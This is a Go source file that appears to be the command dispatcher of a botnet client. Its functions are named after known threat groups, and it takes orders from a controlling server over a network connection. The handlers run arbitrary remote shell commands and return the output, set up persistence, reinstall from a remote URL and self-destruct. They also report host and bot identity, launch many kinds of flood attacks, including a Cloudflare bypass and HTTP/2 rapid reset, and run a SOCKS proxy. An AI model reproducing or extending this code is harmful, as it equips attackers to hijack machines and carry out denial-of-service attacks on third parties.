package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
)

// blackEnergy is the main command dispatcher.
// Attack and SOCKS cases delegate to dispatchAttack / dispatchSocks, which are
// defined in attacks.go (withattacks build tag) or attacks_stub.go (!withattacks),
// and socks.go (withsocks) or socks_stub.go (!withsocks).
// When those files are excluded by build tags the stub returns an error and the
// binary contains zero attack/socks code.
func blackEnergy(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := sidewinder(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
		} else {
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
		}
		return nil
	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go machete(strings.Join(fields[1:], " "), conn)
		conn.Write([]byte(msgStreamStart))
		return nil
	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		oceanLotus(strings.Join(fields[1:], " "))
		conn.Write([]byte(msgBgStart))
		return nil
	case "!stop":
		dispatchAttackStop()
		return nil
	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass", "!rapidreset":
		return dispatchAttack(conn, cmd, fields)
	case "!persist":
		url := ""
		if len(fields) >= 2 {
			url = fields[1]
		}
		go dragonfly(url)
		conn.Write([]byte(msgPersistStart))
	case "!reinstall":
		if len(fields) < 2 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !reinstall <url>")))
			return nil
		}
		go reinstall(fields[1])
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
	case "!kill":
		conn.Write([]byte(msgKillAck))
		nukeAndExit()
	case "!info":
		hostname, _ := os.Hostname()
		arch := charmingKitten()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
	case "!socks", "!stopsocks", "!socksauth":
		return dispatchSocks(conn, cmd, fields)
	default:
		return fmt.Errorf("unknown command")
	}
	return nil
}
